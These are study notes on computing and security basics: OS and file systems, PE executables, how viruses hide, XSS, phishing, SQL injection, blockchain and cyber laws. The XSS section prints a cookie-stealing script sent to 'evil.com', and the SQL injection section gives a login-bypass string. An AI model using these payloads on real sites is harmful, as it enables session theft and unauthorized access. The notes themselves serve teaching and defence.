OS Fundamentals

OS Architecture

An Operating System (OS) is system software that manages hardware and software resources. Its architecture has two core layers: the Kernel (core, runs in privileged mode) and the User Space (applications). The Kernel handles CPU scheduling, memory management, I/O, and process management. OS architectures include Monolithic (all services in kernel — fast but bulky, e.g., Linux), Microkernel (minimal kernel, services in user space — safer, e.g., Minix), and Hybrid (mix of both, e.g., Windows NT). The OS acts as an intermediary between the user and hardware, providing APIs and system calls for applications to request services securely.

OS Libraries & Shell Commands

OS libraries are pre-compiled code collections that programs use to perform common tasks (e.g., libc in Linux). They are of two types: Static Libraries (.lib, .a) — compiled into the executable, and Dynamic/Shared Libraries (.dll, .so) — loaded at runtime. Shell commands are text-based instructions passed to the OS shell (bash, zsh). Common Linux commands: ls (list files), cd (change directory), chmod (permissions), ps (processes), grep (search text), kill (terminate process). The shell interprets these commands and communicates with the kernel via system calls, bridging user intent and hardware execution.

Responsibilities of OS & Kernel

The OS provides: process management, memory management, file system handling, I/O device control, security, and a user interface. The Kernel is the OS core that runs in privileged (Ring 0) mode and directly interacts with hardware. Key kernel responsibilities: Process Scheduling (CPU allocation using algorithms like Round Robin), Virtual Memory (paging, segmentation), Interrupt Handling (responds to hardware signals), Device Drivers (hardware abstraction), and System Call Interface (secure gateway for user programs to access kernel services). Without the kernel, no program can execute. It ensures isolation between processes to prevent crashes and unauthorized access.

Shell Scripting

Shell scripting is the practice of writing scripts (text files) containing a sequence of shell commands that are executed automatically. Scripts start with a shebang line: #!/bin/bash. Key features: Variables (name="Alice"), Conditionals (if/else/fi), Loops (for, while), Functions, and Piping (|) to chain commands. Shell scripts automate repetitive tasks like backups, deployments, and user management. They are interpreted line by line, making them slower than compiled programs but extremely powerful for system administration. Files must have execute permission (chmod +x script.sh) to run.

Linux — Origin, History & GNU

Linux was created by Linus Torvalds in 1991 as a free, open-source Unix-like kernel. The GNU Project, started by Richard Stallman in 1983, aimed to create a completely free OS. GNU provided essential tools (compilers, editors, shells) but lacked a kernel. When Linux kernel was released, it combined with GNU tools to form GNU/Linux — a full operating system. Licensed under GPL (GNU General Public License), any modification must remain open source. Today, Linux powers servers, Android, supercomputers, and embedded systems. Major distributions include Ubuntu, Fedora, Debian, and Arch Linux. Its open-source nature makes it highly customizable, secure, and community-driven.

Linux File System Structure

Linux uses a hierarchical file system starting at root (/). Key directories: /bin (essential binaries), /etc (config files), /home (user directories), /var (variable data/logs), /tmp (temporary files), /dev (device files), /proc (virtual filesystem for processes), /usr (user programs), /boot (kernel and bootloader). Unlike Windows, Linux treats everything as a file — devices, processes, and sockets are represented as files. The default Linux filesystem is ext4, supporting journaling, large files, and fault recovery. The FHS (Filesystem Hierarchy Standard) defines these conventions uniformly across distributions.

GUI vs CLI

A CLI (Command Line Interface) accepts text commands directly. A GUI (Graphical User Interface) uses windows, icons, and mouse interaction. CLI advantages: faster execution, scriptable, less memory usage, remote access via SSH, precise control. GUI advantages: user-friendly, visual feedback, lower learning curve, ideal for beginners. CLI is preferred in servers and cybersecurity (e.g., Kali Linux). GUI is used in desktop environments (GNOME, KDE). In Linux, both coexist — CLI through terminal emulators (bash), GUI through display servers (X11, Wayland). For power users and administrators, CLI is indispensable as it allows automation, remote management, and deep system access that GUI cannot easily replicate.

File System

NTFS, FAT & FAT32

FAT (File Allocation Table): oldest, simple structure, 8.3 filename limit, no permissions, max 2GB file. FAT32: improved FAT, supports 4GB max file size, 32GB partition limit, widely compatible across OS (USB drives). NTFS (New Technology File System): used in modern Windows. Supports large files (16EB), file permissions (ACLs), journaling (crash recovery), compression, and encryption (BitLocker). Journaling logs changes before writing, preventing corruption. NTFS uses MFT (Master File Table) to track all files. FAT32 is preferred for portability; NTFS for security and reliability. Linux can read NTFS via ntfs-3g driver. FAT has no security model — anyone can read/write.

FAT32NTFSMFTJournalingACLs

File System

File Permissions & Octal Representation

Linux file permissions control access for three entities: Owner, Group, Others. Each has three permissions: Read (r=4), Write (w=2), Execute (x=1). Displayed as: -rwxr-xr--. Octal representation sums these values: rwx = 7, r-x = 5, r-- = 4. So chmod 754 means owner=full, group=read+execute, others=read only. Special permissions: SUID (4xxx) runs file as owner, SGID (2xxx) inherits group, Sticky bit (1xxx) only owner can delete. Use ls -l to view permissions. Correct permission setting is critical for system security — misconfigured permissions can allow unauthorized access or privilege escalation.

Executables

Structure of a .exe PE File

A Windows executable uses the PE (Portable Executable) format. Structure: DOS Header (starts with "MZ", legacy compatibility), PE Header (signature "PE\0\0", machine type, number of sections), Optional Header (entry point address, image base, subsystem), Section Table (directory of sections), and Sections: .text (executable code), .data (initialized variables), .rdata (read-only data/strings), .bss (uninitialized data), .rsrc (resources like icons), .idata (import table). The Import Address Table (IAT) lists required DLLs. Tools like PE Explorer or CFF Explorer allow analysis of PE files for reverse engineering and malware detection.

MZ Header.text.dataIATEntry Point

Executables

How an .exe Loads

When an .exe is executed: 1) Windows Loader reads the PE header to determine memory requirements. 2) A Virtual Address Space is created for the process. 3) The file is mapped into memory at the preferred base address (or relocated if occupied). 4) The Import Table is resolved — required DLLs are loaded and function addresses written to the IAT. 5) TLS Callbacks (Thread Local Storage) execute if present. 6) Control passes to the Entry Point (usually main() or WinMain()). 7) The runtime initializes (C runtime, global constructors). 8) Program execution begins. Understanding this process is critical for malware analysis and debugging.

How a Virus Hides in an .exe

Viruses use multiple techniques to hide inside executables: Code Cave Injection — virus code is inserted into unused padding between sections; Section Appending — a new malicious section is added; Entry Point Modification — the entry point is changed to run virus code first, then jump to original code (EPO). Polymorphic Viruses change their code on each infection to avoid signature detection. Metamorphic Viruses completely rewrite themselves. Packers/Cryptors compress/encrypt the payload, which decrypts at runtime — evading static analysis. Import Table Manipulation hides which APIs are called. Antivirus tools use heuristics, behavioral analysis, and sandboxing to detect these hidden threats.

Cloud Computing & Virtualization

Virtualization creates virtual instances of hardware, OS, or storage using a Hypervisor. Type 1 (bare-metal): runs directly on hardware (VMware ESXi, Hyper-V). Type 2: runs on a host OS (VirtualBox, VMware Workstation). Cloud Computing delivers computing services over the internet. Service models: IaaS (Infrastructure — raw VMs: AWS EC2), PaaS (Platform — dev environment: Heroku), SaaS (Software — apps: Gmail). Deployment: Public, Private, Hybrid. Benefits: scalability, cost efficiency, redundancy. Containers (Docker) are lighter than VMs — they share the host OS kernel but isolate application environments. Cloud security concerns: data breaches, misconfigured storage, and shared tenancy risks.

Web Security

XSS — Cross-Site Scripting

XSS is a web vulnerability where an attacker injects malicious JavaScript into a webpage viewed by other users. Types: Stored XSS — script saved in database, executes for all viewers; Reflected XSS — script in URL, executes when link is clicked; DOM-based XSS — manipulates the DOM directly without server interaction. Impact: cookie theft, session hijacking, keylogging, phishing overlays. Example: <script>document.location='evil.com?c='+document.cookie</script>. Prevention: Output encoding (HTML encode user input), Content Security Policy (CSP) headers, input sanitization, using HttpOnly cookies to prevent JS access, and frameworks like React that auto-escape output. XSS is consistently in OWASP Top 10.

Phishing

Phishing is a social engineering attack where attackers impersonate trusted entities (banks, Google, PayPal) to trick users into revealing credentials, credit card numbers, or installing malware. Techniques: Email Phishing (fake emails with malicious links), Spear Phishing (targeted, personalized attacks), Smishing (SMS-based), Vishing (voice calls), Clone Phishing (copying legitimate emails). Attackers use look-alike domains (g00gle.com), SSL certificates to appear trusted, and urgency tactics. Prevention: Multi-Factor Authentication (MFA), email filtering, user education, checking URLs carefully, DMARC/SPF/DKIM email authentication, and anti-phishing browser extensions. Phishing causes 90% of data breaches globally.

SQL Injection

SQL Injection (SQLi) occurs when user input is directly embedded in SQL queries without sanitization, allowing attackers to manipulate the database. Example: Input ' OR '1'='1 in login bypasses authentication. Types: Classic (direct data extraction), Blind SQLi (true/false responses reveal data), Time-based Blind (delays indicate truth), Out-of-band (exfiltration via DNS/HTTP). Attackers can dump databases, bypass login, delete data, or gain OS access. Prevention: Use Prepared Statements / Parameterized Queries (most effective), ORMs, input validation/whitelist, stored procedures, least privilege DB accounts, and WAF (Web Application Firewall). SQLi remains OWASP's #1 injection vulnerability.

Preventative Measures — URL Encode & Sanitization

URL Encoding converts special characters into percent-encoded format so they are safely transmitted in URLs. Example: space → %20, < → %3C. This prevents injection characters from being interpreted by browsers or servers. Input Sanitization removes or escapes dangerous characters from user input before processing. Output Encoding converts data to safe display format (HTML entities: < → &lt;). Validation ensures input matches expected format (email, number). Other measures: Content Security Policy (CSP) — restricts script sources; HTTPS — encrypts data in transit; Rate Limiting — prevents brute force; CORS — controls cross-origin access; Prepared Statements — prevents SQLi. Defense-in-depth layers multiple controls for robust security.

Joining & Splicing in Python

In Python, String Joining uses str.join(iterable) to concatenate elements of a list into a single string with a delimiter. Example: ", ".join(["a","b","c"]) → "a, b, c". More efficient than + concatenation in loops. Splicing (Slicing) extracts portions of sequences (strings, lists) using [start:stop:step]. Example: "Python"[1:4] → "yth"; "Hello"[::-1] → "olleH" (reverse). Negative indexing counts from the end: [-1] = last element. Slicing is non-destructive — it returns a new object. These are essential for string manipulation, data parsing, and processing text in scripts, especially for security tasks like log parsing or data extraction.

Python OS Module

The Python os module provides a portable interface to OS-level operations. Key functions: os.getcwd() — returns current working directory; os.chdir(path) — changes current directory; os.listdir(path) — returns list of files/folders in directory; os.mkdir() / os.makedirs() — create directories; os.remove() — delete file; os.rename() — rename file/folder; os.path.join() — safely concatenate paths (cross-platform); os.path.exists() — check if path exists; os.path.isfile() / os.path.isdir() — type checks; os.environ — access environment variables. The os.path submodule is crucial for writing portable scripts that work on both Windows and Linux without hardcoding path separators.

Bitcoin & Transaction Mechanism

Bitcoin is a decentralized digital currency using blockchain — a distributed, immutable ledger. Transactions work as follows: the sender broadcasts a transaction (sender address, recipient address, amount, digital signature) to the P2P network. Miners validate using the sender's public key and digital signature. Validated transactions are grouped into blocks. Double Spending is the risk of spending the same Bitcoin twice. Bitcoin prevents this through consensus — once a transaction is confirmed and embedded deep in the blockchain (6+ confirmations), altering it requires recalculating all subsequent blocks, requiring >51% of the network's computing power (51% Attack). The UTXO (Unspent Transaction Output) model tracks which coins have been spent, preventing duplication without a central authority.

Mining, Proof of Work & Consensus

Mining is the process of adding new blocks to the blockchain. Miners compete to solve a Proof of Work (PoW) puzzle: find a nonce such that SHA-256(block data + nonce) produces a hash below a target value (starts with N zeros). This is computationally expensive but easy to verify. The winner broadcasts the block, earns block reward (newly minted Bitcoin) + transaction fees. Difficulty adjusts every 2016 blocks (~2 weeks) to maintain ~10 min per block. Consensus is achieved when the majority of nodes accept the longest valid chain. Hashing (SHA-256) ensures tamper-evidence — changing one block changes its hash, breaking all subsequent blocks, making fraud computationally infeasible.

Mining Pool

A Mining Pool is a group of miners who combine their computational power to increase their chances of successfully mining a block and share the rewards proportionally. Since solo mining has low probability of success against large mining farms, pools provide more consistent income. A Pool Coordinator distributes work units (partial PoW problems called shares) to each miner. When the pool mines a block, the reward is distributed based on contributed shares. Popular pools: F2Pool, AntPool, Foundry USA. Risks: Centralization — if one pool exceeds 51% hash rate, it could execute a 51% attack. Pool fees (1-3%) are charged. Mining pools have made individual mining economically viable despite increasing network difficulty.

Byzantine Fault Tolerance (BFT)

Byzantine Fault Tolerance (BFT) is a distributed system's ability to function correctly even when some nodes fail or act maliciously, sending conflicting information — known as the Byzantine Generals Problem. In a blockchain context, BFT ensures consensus even when up to ⌊(n-1)/3⌋ nodes are malicious (where n = total nodes). PBFT (Practical BFT) — used in permissioned blockchains (Hyperledger) — achieves consensus through a 3-phase protocol (pre-prepare, prepare, commit). Bitcoin's PoW achieves probabilistic BFT through economic incentives — attacking requires enormous hash power (>51%). BFT is critical for blockchain reliability, especially in financial applications, ensuring the network reaches agreement without trusting individual nodes.

Digital Laws

HIPAA

The Health Insurance Portability and Accountability Act (HIPAA), enacted in 1996 in the USA, regulates the protection of patient health information (PHI — Protected Health Information). Key rules: Privacy Rule — governs use/disclosure of PHI; Security Rule — requires administrative, physical, and technical safeguards for electronic PHI (ePHI); Breach Notification Rule — requires notifying patients within 60 days of a breach; Enforcement Rule — penalties up to $1.9M per violation category per year. Entities covered: hospitals, clinics, health insurers, and their business associates. Violations can be civil or criminal. HIPAA mandates encryption, access controls, audit trails, and employee training. It is a critical law for healthcare IT and cybersecurity professionals.

FISMA

The Federal Information Security Management Act (FISMA), enacted in 2002 (updated 2014 as FISMA Reform Act), requires US federal agencies to develop, document, and implement information security programs. It mandates: Risk categorization using FIPS 199 (Low/Moderate/High), Minimum security controls (NIST SP 800-53), Annual security reviews, Continuous monitoring, and Incident response plans. Each agency must appoint a CISO (Chief Information Security Officer). The OMB oversees compliance; NIST provides standards. Non-compliance can result in funding cuts. FISMA created a framework for federal cybersecurity, ensuring government systems (and contractors handling federal data) maintain adequate security standards. It applies to all federal information systems including cloud services.

Digital Security Act / Cyber Security Act (2023)

Bangladesh's Digital Security Act (DSA) 2018 — and its replacement, the Cyber Security Act 2023 — govern digital crimes and online security. The 2023 Act addresses: cybercrime, hacking, identity theft, online defamation, spreading misinformation, and unauthorized data access. Key provisions: Section 17 — critical infrastructure attacks (up to 14 years), Section 19 — hacking (7 years), Section 25 — spreading harmful content (3 years), Section 29 — online defamation (3 years). The act establishes a Digital Security Agency and CIRT (Computer Incident Response Team). Criticism: broad provisions may restrict freedom of expression. Internationally, the EU Cybersecurity Act (2019) established ENISA's permanent mandate and an EU-wide cybersecurity certification framework for ICT products and services.
